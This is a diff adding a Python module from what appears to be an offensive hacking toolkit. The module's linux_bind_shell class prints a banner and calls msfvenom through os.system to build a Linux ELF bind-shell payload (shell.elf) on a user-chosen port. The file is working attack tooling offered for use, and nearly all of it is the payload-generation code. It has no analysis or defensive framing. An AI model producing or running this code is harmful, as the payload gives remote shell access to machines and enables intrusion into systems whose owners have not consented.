@@ -1,0 +1,25 @@
+#Modules
+from etc.banner import banner_drgn
+from etc.set import clear
+from etc.set import *
+from lib.list import list_tools
+from lib.list import list_Linux
+#===================
+import sys,os,socket,time,datetime
+#===================
+NFound='\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
+Aborted='\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
+#===================
+class linux_bind_shell:
+    def __init__(self, lport):
+        self.lport = lport
+        try:
+            clear()
+            print('''
+  [+] LOCAL PORT : {}
+  [+] REMOTE HOST: 127.0.0.1
+  [!] Loading ....'''.format(self.lport))
+            os.system('msfvenom -p generic/shell_bind_tcp RHOST=127.0.0.1 LPORT={} -f elf > shell.elf'.format(self.lport))
+            sys.exit('\u001b[1m[\u001b[32;1mSUCCESSFULLY\u001b[0m\u001b[1m]\u001b[0m')
+        except KeyboardInterrupt:
+            sys.exit(Aborted)
